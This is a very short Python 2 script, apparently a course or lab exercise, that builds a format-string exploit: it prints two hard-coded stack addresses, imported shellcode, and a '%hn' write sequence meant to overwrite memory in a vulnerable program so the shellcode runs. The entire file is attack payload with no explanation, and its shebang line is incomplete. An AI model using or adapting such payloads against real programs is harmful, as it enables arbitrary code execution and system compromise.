#!/usr/bin/env
from shellcode import shellcode

print "\x6c\x87\xfe\xbf"+"\x6e\x87\xfe\xbf"+shellcode+"%49118x.%5$hn%49001x.%4$hn"
